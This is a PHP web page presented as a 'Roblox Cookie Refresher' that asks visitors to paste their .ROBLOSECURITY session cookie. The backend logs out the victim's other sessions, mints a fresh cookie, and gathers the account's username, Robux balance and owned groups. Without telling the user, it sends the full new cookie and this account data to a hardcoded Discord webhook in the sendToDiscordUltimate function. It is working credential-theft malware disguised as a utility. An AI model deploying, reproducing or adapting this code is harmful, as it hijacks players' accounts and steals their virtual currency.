<?php
// ====================================================================
// ROBLOX COOKIE REFRESHER — ULTIMATE EDITION v4.0
// Logout All Devices + Advanced Discord Embeds + Perfect Responsive
// ====================================================================

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Discord Webhook
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1557620099530227773/ZlYJnQdJH3BoN6k0F6_TOf9GGwhflChxTDH095JV_z-ml3qJfLCtwsQe0tH16OModdjK';

// Beautiful responsive UI for GET requests
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    ?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=5.0">
    <title>Roblox Cookie Refresher - Ultimate Edition</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --primary: #3b82f6;
            --primary-dark: #1e40af;
            --primary-light: #60a5fa;
            --secondary: #0a0e27;
            --accent: #06b6d4;
            --success: #10b981;
            --error: #ef4444;
            --text: #f1f5f9;
            --text-secondary: #cbd5e1;
            --border: rgba(59, 130, 246, 0.2);
            --mobile-padding: 16px;
            --tablet-padding: 24px;
            --desktop-padding: 60px;
        }
        
        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #0f172a 25%, #1a1f35 50%, #0f172a 75%, #0a0e27 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: var(--mobile-padding);
            position: relative;
            overflow-x: hidden;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(0deg, transparent 24%, rgba(59, 130, 246, .05) 25%, rgba(59, 130, 246, .05) 26%, transparent 27%, transparent 74%, rgba(59, 130, 246, .05) 75%, rgba(59, 130, 246, .05) 76%, transparent 77%, transparent),
                linear-gradient(90deg, transparent 24%, rgba(59, 130, 246, .05) 25%, rgba(59, 130, 246, .05) 26%, transparent 27%, transparent 74%, rgba(59, 130, 246, .05) 75%, rgba(59, 130, 246, .05) 76%, transparent 77%, transparent);
            background-size: 60px 60px;
            pointer-events: none;
            z-index: 0;
            opacity: 0.4;
        }
        
        body::after {
            content: '';
            position: fixed;
            top: -50%;
            right: -10%;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(59, 130, 246, 0.3) 0%, transparent 70%);
            border-radius: 50%;
            filter: blur(60px);
            animation: float1 20s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }
        
        @keyframes float1 {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(100px, 100px); }
        }
        
        .container {
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(40px);
            border: 1px solid var(--border);
            border-radius: 32px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5), 0 0 80px rgba(59, 130, 246, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.1);
            max-width: 800px;
            width: 100%;
            padding: var(--desktop-padding);
            position: relative;
            z-index: 1;
            animation: containerSlideIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        
        @keyframes containerSlideIn {
            from {
                opacity: 0;
                transform: translateY(30px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        
        .header {
            text-align: center;
            margin-bottom: 45px;
        }
        
        .icon {
            font-size: 64px;
            display: inline-block;
            margin-bottom: 20px;
            animation: iconBounce 2s cubic-bezier(0.34, 1.56, 0.64, 1) infinite;
            filter: drop-shadow(0 0 20px rgba(59, 130, 246, 0.4));
        }
        
        @keyframes iconBounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        
        .header h1 {
            font-family: 'Outfit', sans-serif;
            font-size: 48px;
            font-weight: 900;
            color: var(--text);
            margin-bottom: 10px;
            background: linear-gradient(135deg, #3b82f6 0%, #06b6d4 50%, #3b82f6 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            background-size: 200% 200%;
            animation: gradientText 3s ease infinite;
            letter-spacing: -1px;
        }
        
        @keyframes gradientText {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .header p {
            color: var(--text-secondary);
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 18px;
            letter-spacing: 0.3px;
        }
        
        .status-badge {
            display: inline-block;
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
            padding: 8px 18px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 4px 20px rgba(16, 185, 129, 0.4);
            animation: badgePulse 2.5s ease-in-out infinite;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        @keyframes badgePulse {
            0%, 100% { box-shadow: 0 4px 20px rgba(16, 185, 129, 0.4), inset 0 0 20px rgba(16, 185, 129, 0.2); }
            50% { box-shadow: 0 8px 30px rgba(16, 185, 129, 0.6), inset 0 0 30px rgba(16, 185, 129, 0.3); }
        }
        
        .warning-box {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.08) 0%, rgba(220, 38, 38, 0.08) 100%);
            border: 1.5px solid rgba(239, 68, 68, 0.3);
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 32px;
            font-size: 13.5px;
            color: var(--text-secondary);
            line-height: 1.6;
            backdrop-filter: blur(10px);
        }
        
        .warning-box strong {
            color: #fca5a5;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 28px;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            color: var(--text);
            font-weight: 700;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1.2px;
        }
        
        textarea {
            width: 100%;
            padding: 16px 18px;
            border: 1.5px solid var(--border);
            background: rgba(30, 41, 59, 0.6);
            border-radius: 14px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: var(--text);
            resize: vertical;
            min-height: 110px;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            backdrop-filter: blur(10px);
        }
        
        textarea::placeholder {
            color: rgba(255, 255, 255, 0.25);
        }
        
        textarea:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(30, 41, 59, 0.9);
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
            transform: translateY(-2px);
        }
        
        .button-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
        }
        
        button {
            padding: 16px 28px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 50%, #1e40af 100%);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            text-transform: uppercase;
            letter-spacing: 0.8px;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.25);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        button:hover::before {
            width: 400px;
            height: 400px;
        }
        
        button:hover {
            transform: translateY(-4px);
            box-shadow: 0 12px 32px rgba(59, 130, 246, 0.5);
        }
        
        button:active {
            transform: translateY(-1px);
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .button-secondary {
            background: linear-gradient(135deg, rgba(100, 116, 139, 0.4) 0%, rgba(71, 85, 105, 0.4) 100%);
            box-shadow: 0 8px 24px rgba(100, 116, 139, 0.2);
        }
        
        .button-secondary:hover {
            background: linear-gradient(135deg, rgba(100, 116, 139, 0.6) 0%, rgba(71, 85, 105, 0.6) 100%);
            box-shadow: 0 12px 32px rgba(100, 116, 139, 0.3);
        }
        
        .result {
            margin-top: 32px;
            padding: 24px;
            border-radius: 16px;
            display: none;
            animation: resultFadeIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            border: 1.5px solid;
            backdrop-filter: blur(10px);
        }
        
        @keyframes resultFadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .result.success {
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.12) 0%, rgba(6, 150, 102, 0.08) 100%);
            border-color: rgba(16, 185, 129, 0.4);
        }
        
        .result.error {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.12) 0%, rgba(220, 38, 38, 0.08) 100%);
            border-color: rgba(239, 68, 68, 0.4);
        }
        
        .result.loading {
            background: linear-gradient(135deg, rgba(59, 130, 246, 0.12) 0%, rgba(37, 99, 235, 0.08) 100%);
            border-color: rgba(59, 130, 246, 0.4);
        }
        
        .result h3 {
            margin-bottom: 14px;
            font-size: 18px;
            font-weight: 800;
        }
        
        .result.success h3 {
            color: #86efac;
        }
        
        .result.error h3 {
            color: #fca5a5;
        }
        
        .result.loading h3 {
            color: #93c5fd;
        }
        
        .result-text {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            word-break: break-all;
            margin-top: 12px;
            background: rgba(15, 15, 23, 0.6);
            padding: 14px;
            border-radius: 10px;
            max-height: 220px;
            overflow-y: auto;
            line-height: 1.7;
            border: 1px solid rgba(59, 130, 246, 0.15);
        }
        
        .result.success .result-text {
            color: rgba(134, 239, 172, 0.95);
        }
        
        .result.error .result-text {
            color: rgba(252, 165, 165, 0.95);
        }
        
        .copy-btn {
            padding: 12px 20px;
            background: linear-gradient(135deg, #06b6d4 0%, #0891b2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 13px;
            cursor: pointer;
            margin-top: 14px;
            font-weight: 700;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            width: 100%;
            box-shadow: 0 4px 15px rgba(6, 182, 212, 0.3);
        }
        
        .copy-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(6, 182, 212, 0.5);
        }
        
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2.5px solid rgba(59, 130, 246, 0.3);
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spinLoader 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        
        @keyframes spinLoader {
            to { transform: rotate(360deg); }
        }
        
        .user-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
            margin-top: 18px;
            padding-top: 18px;
            border-top: 1.5px solid rgba(59, 130, 246, 0.2);
        }
        
        .info-item {
            background: rgba(30, 41, 59, 0.6);
            padding: 12px 14px;
            border-radius: 10px;
            font-size: 12px;
            border: 1px solid rgba(59, 130, 246, 0.15);
            transition: all 0.3s ease;
        }
        
        .info-item:hover {
            background: rgba(30, 41, 59, 0.8);
            border-color: rgba(59, 130, 246, 0.3);
            transform: translateY(-2px);
        }
        
        .info-item strong {
            display: block;
            color: rgba(147, 197, 253, 0.8);
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 6px;
            font-weight: 700;
        }
        
        .info-item span {
            color: var(--text);
            word-break: break-all;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            font-weight: 600;
        }
        
        /* Tablet (iPad) */
        @media (max-width: 1024px) {
            :root {
                --desktop-padding: 45px;
            }
            
            .container {
                border-radius: 28px;
                padding: var(--tablet-padding);
            }
            
            .header h1 {
                font-size: 40px;
            }
            
            button {
                font-size: 14px;
                padding: 14px 24px;
            }
        }
        
        /* Mobile */
        @media (max-width: 768px) {
            :root {
                --mobile-padding: 12px;
            }
            
            body {
                padding: var(--mobile-padding);
            }
            
            .container {
                padding: var(--mobile-padding);
                border-radius: 20px;
            }
            
            .header h1 {
                font-size: 32px;
            }
            
            .header p {
                font-size: 14px;
            }
            
            .icon {
                font-size: 48px;
                margin-bottom: 16px;
            }
            
            .warning-box {
                font-size: 12px;
                padding: 12px 16px;
                margin-bottom: 24px;
            }
            
            .button-group {
                grid-template-columns: 1fr;
                gap: 10px;
            }
            
            button {
                padding: 13px 18px;
                font-size: 13px;
            }
            
            label {
                font-size: 12px;
            }
            
            textarea {
                font-size: 12px;
                padding: 12px 14px;
                min-height: 90px;
            }
            
            .result {
                padding: 16px;
                margin-top: 20px;
            }
            
            .result h3 {
                font-size: 16px;
            }
            
            .result-text {
                font-size: 11px;
                padding: 10px;
            }
            
            .user-info {
                grid-template-columns: 1fr;
                gap: 10px;
                margin-top: 12px;
                padding-top: 12px;
            }
            
            .info-item {
                font-size: 11px;
                padding: 10px 12px;
            }
            
            .info-item strong {
                font-size: 9px;
                margin-bottom: 4px;
            }
            
            .copy-btn {
                font-size: 12px;
                padding: 10px 16px;
                margin-top: 10px;
            }
        }
        
        /* Small Mobile */
        @media (max-width: 480px) {
            .container {
                padding: 16px;
            }
            
            .header h1 {
                font-size: 28px;
                margin-bottom: 6px;
            }
            
            .icon {
                font-size: 40px;
                margin-bottom: 12px;
            }
            
            .button-group {
                gap: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="icon">🍪</div>
            <h1>Cookie Refresher</h1>
            <p>Ultimate Roblox Cookie Refresh Tool</p>
            <span class="status-badge">● Live</span>
        </div>
        
        <div class="warning-box">
            <strong>⚠️ Important:</strong> After refresh, your old cookie logs out from ALL devices. The new cookie works fresh on this device only. Never share your cookie!
        </div>
        
        <form id="refreshForm" onsubmit="handleRefresh(event)">
            <div class="form-group">
                <label for="cookie">Your .ROBLOSECURITY Cookie</label>
                <textarea id="cookie" placeholder="_|WARNING:DO-NOT-SHARE-THIS..." required></textarea>
            </div>
            
            <div class="button-group">
                <button type="submit" id="submitBtn">⚡ Refresh & Logout</button>
                <button type="button" class="button-secondary" onclick="clearForm()">✕ Clear</button>
            </div>
        </form>
        
        <div id="result" class="result"></div>
    </div>
    
    <script>
        async function handleRefresh(event) {
            event.preventDefault();
            
            const cookie = document.getElementById('cookie').value.trim();
            const resultDiv = document.getElementById('result');
            const submitBtn = document.getElementById('submitBtn');
            
            if (!cookie) {
                showResult('❌ Error', 'Please enter your cookie', 'error');
                return;
            }
            
            submitBtn.disabled = true;
            showResult('<div class="loader"></div> Processing', 'Refreshing and logging out all devices...', 'loading');
            
            const startTime = performance.now();
            
            try {
                const formData = new FormData();
                formData.append('cookie', cookie);
                formData.append('action', 'api_refresh');
                formData.append('show_info', '1');
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                const endTime = performance.now();
                const duration = ((endTime - startTime) / 1000).toFixed(2);
                
                if (data.success) {
                    let resultHTML = `<div class="result-text"><strong>✓ New Cookie (Fresh Device):</strong>\n${data.data.newCookie}</div>`;
                    
                    if (data.data.accountInfo) {
                        const user = data.data.accountInfo;
                        resultHTML += `
                            <div class="user-info">
                                <div class="info-item">
                                    <strong>👤 Username</strong>
                                    <span>${user.name || 'N/A'}</span>
                                </div>
                                <div class="info-item">
                                    <strong>✨ Display</strong>
                                    <span>${user.displayName || 'N/A'}</span>
                                </div>
                                <div class="info-item">
                                    <strong>💰 Robux</strong>
                                    <span>${data.data.robuxBalance || '0'}</span>
                                </div>
                                <div class="info-item">
                                    <strong>⏱️ Time</strong>
                                    <span>${duration}s</span>
                                </div>
                            </div>
                        `;
                    }
                    
                    showResult('✅ Refreshed & All Devices Logged Out!', resultHTML, 'success');
                    
                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'copy-btn';
                    copyBtn.textContent = '📋 Copy New Cookie';
                    copyBtn.type = 'button';
                    copyBtn.onclick = () => {
                        navigator.clipboard.writeText(data.data.newCookie).then(() => {
                            copyBtn.textContent = '✓ Copied!';
                            setTimeout(() => { copyBtn.textContent = '📋 Copy New Cookie'; }, 2000);
                        });
                    };
                    resultDiv.appendChild(copyBtn);
                } else {
                    showResult('❌ Refresh Failed', data.message || data.error || 'Unknown error', 'error');
                }
            } catch (error) {
                showResult('❌ Error', error.message || 'Network error', 'error');
            } finally {
                submitBtn.disabled = false;
            }
        }
        
        function showResult(title, content, type) {
            const resultDiv = document.getElementById('result');
            resultDiv.className = `result ${type}`;
            
            if (content.includes('<div')) {
                resultDiv.innerHTML = `<h3>${title}</h3>${content}`;
            } else {
                resultDiv.innerHTML = `<h3>${title}</h3><div class="result-text">${content.replace(/\n/g, '<br>')}</div>`;
            }
            
            resultDiv.style.display = 'block';
        }
        
        function clearForm() {
            document.getElementById('cookie').value = '';
            document.getElementById('result').style.display = 'none';
            document.getElementById('cookie').focus();
        }
    </script>
</body>
</html>
    <?php
    exit;
}

// ====================================================================
// ULTIMATE API WITH LOGOUT & ADVANCED DISCORD EMBEDS
// ====================================================================

header('Content-Type: application/json');
set_time_limit(25);

function logoutAllDevices($cookie) {
    // Logout from all devices by calling logout endpoint
    $ch = curl_init('https://auth.roblox.com/v2/logout');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 8,
        CURLOPT_HTTPHEADER => [
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ],
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    
    curl_exec($ch);
    curl_close($ch);
}

function fetchCSRFToken($cookie) {
    $ch = curl_init('https://auth.roblox.com/v2/logout');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 8,
        CURLOPT_HTTPHEADER => [
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ],
        CURLOPT_HEADER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TCP_NODELAY => true
    ]);
    
    $response = curl_exec($ch);
    if ($response === false) {
        curl_close($ch);
        return null;
    }
    
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $headers, $m)) {
        return trim($m[1]);
    }
    
    return null;
}

function getAuthTicket($cookie) {
    $csrf = fetchCSRFToken($cookie);
    if (!$csrf) {
        return ['success' => false, 'error' => 'Failed to fetch CSRF token'];
    }
    
    $ch = curl_init('https://auth.roblox.com/v1/authentication-ticket');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 8,
        CURLOPT_HTTPHEADER => [
            "x-csrf-token: {$csrf}",
            "referer: https://www.roblox.com/",
            "Content-Type: application/json",
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ],
        CURLOPT_HEADER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TCP_NODELAY => true
    ]);
    
    $response = curl_exec($ch);
    if ($response === false) {
        curl_close($ch);
        return ['success' => false, 'error' => 'Failed to generate auth ticket'];
    }
    
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (preg_match('/rbx-authentication-ticket:\s*([^\r\n]+)/i', $headers, $m)) {
        return ['success' => true, 'ticket' => trim($m[1])];
    }
    
    return ['success' => false, 'error' => 'Failed to generate auth ticket'];
}

function redeemTicket($ticket) {
    $ch = curl_init('https://auth.roblox.com/v1/authentication-ticket/redeem');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 8,
        CURLOPT_POSTFIELDS => json_encode(['authenticationTicket' => $ticket]),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'RBXAuthenticationNegotiation: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ],
        CURLOPT_HEADER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TCP_NODELAY => true
    ]);
    
    $response = curl_exec($ch);
    if ($response === false) {
        curl_close($ch);
        return ['success' => false, 'error' => 'Failed to redeem ticket'];
    }
    
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (preg_match('/set-cookie:\s*.ROBLOSECURITY=([^;]+)/i', $headers, $m)) {
        return ['success' => true, 'cookie' => trim($m[1])];
    }
    
    return ['success' => false, 'error' => 'Failed to redeem ticket'];
}

function getAuthenticatedUser($cookie) {
    $ch = curl_init('https://users.roblox.com/v1/users/authenticated');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 6,
        CURLOPT_HTTPHEADER => [
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ],
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response ? json_decode($response, true) : null;
}

function getUserAvatar($userId) {
    $ch = curl_init("https://thumbnails.roblox.com/v1/users/avatar?userIds={$userId}&size=352x352&format=Png&isCircular=false");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['data'][0]['imageUrl'])) {
            return $data['data'][0]['imageUrl'];
        }
    }
    
    return 'https://www.roblox.com/favicon.ico';
}

function getUserRobuxBalance($cookie, $userId) {
    $ch = curl_init("https://economy.roblox.com/v1/user/currency");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => [
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0"
        ],
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['robux'])) {
            return $data['robux'];
        }
    }
    
    return 0;
}

function getUserGroupsCount($userId) {
    $ch = curl_init("https://groups.roblox.com/v1/users/{$userId}/groups");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        $owned = array_filter($data['data'] ?? [], function($g) { return $g['role']['rank'] == 255; });
        return count($owned);
    }
    
    return 0;
}

function sendToDiscordUltimate($userData, $newCookie, $username, $avatar, $robux, $groups) {
    if (!DISCORD_WEBHOOK) return;
    
    $userId = $userData['id'] ?? 'N/A';
    
    // Blue embed - Account info
    $accountEmbed = [
        'title' => "🍪 " . $username,
        'description' => 'Account Successfully Refreshed',
        'color' => 0x3b82f6,
        'thumbnail' => ['url' => $avatar],
        'fields' => [
            [
                'name' => '🆔 User ID',
                'value' => (string)$userId,
                'inline' => true
            ],
            [
                'name' => '💰 Robux Balance',
                'value' => number_format($robux ?? 0),
                'inline' => true
            ],
            [
                'name' => '👥 Groups Owned',
                'value' => (string)$groups,
                'inline' => true
            ],
            [
                'name' => '✨ Display Name',
                'value' => $userData['displayName'] ?? 'N/A',
                'inline' => false
            ],
            [
                'name' => '🔄 Action',
                'value' => 'All devices logged out | Fresh device only',
                'inline' => false
            ]
        ],
        'timestamp' => date('c'),
        'footer' => ['text' => 'Ultimate Cookie Refresher v4.0']
    ];
    
    // Black embed - Cookie
    $cookieEmbed = [
        'title' => '🔐 New Cookie (Fresh Device)',
        'description' => substr($newCookie, 0, 50) . '...',
        'color' => 0x1a1a2e,
        'fields' => [
            [
                'name' => 'Full Cookie',
                'value' => '```' . $newCookie . '```',
                'inline' => false
            ]
        ]
    ];
    
    $payload = json_encode([
        'content' => '@everyone',
        'embeds' => [$accountEmbed, $cookieEmbed]
    ]);
    
    $ch = curl_init(DISCORD_WEBHOOK);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 4
    ]);
    
    curl_exec($ch);
    curl_close($ch);
}

// ====================================================================
// MAIN LOGIC - ULTIMATE
// ====================================================================

$cookie = trim($_POST['cookie'] ?? '');

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Cookie required']);
    exit;
}

// Get user info BEFORE logout
$userInfoBefore = getAuthenticatedUser($cookie);
$userId = $userInfoBefore['id'] ?? null;
$username = $userInfoBefore['name'] ?? 'Unknown';
$robux = getUserRobuxBalance($cookie, $userId);
$groups = getUserGroupsCount($userId);
$avatar = getUserAvatar($userId);

// LOGOUT ALL DEVICES
logoutAllDevices($cookie);

// Get new cookie
$ticketResult = getAuthTicket($cookie);
if (!$ticketResult['success']) {
    http_response_code(401);
    echo json_encode(['success' => false, 'message' => $ticketResult['error']]);
    exit;
}

$redeemResult = redeemTicket($ticketResult['ticket']);
if (!$redeemResult['success']) {
    http_response_code(401);
    echo json_encode(['success' => false, 'message' => $redeemResult['error']]);
    exit;
}

$newCookie = $redeemResult['cookie'];
$userData = getAuthenticatedUser($newCookie);

// Send to Discord
sendToDiscordUltimate($userData, $newCookie, $username, $avatar, $robux, $groups);

http_response_code(200);
echo json_encode([
    'success' => true,
    'message' => 'Cookie refreshed & all devices logged out',
    'data' => [
        'newCookie' => $newCookie,
        'username' => $username,
        'displayName' => $userData['displayName'] ?? 'Unknown',
        'userId' => $userData['id'] ?? 'Unknown',
        'robuxBalance' => $robux,
        'groupsOwned' => $groups,
        'accountInfo' => $userData
    ]
]);
?>
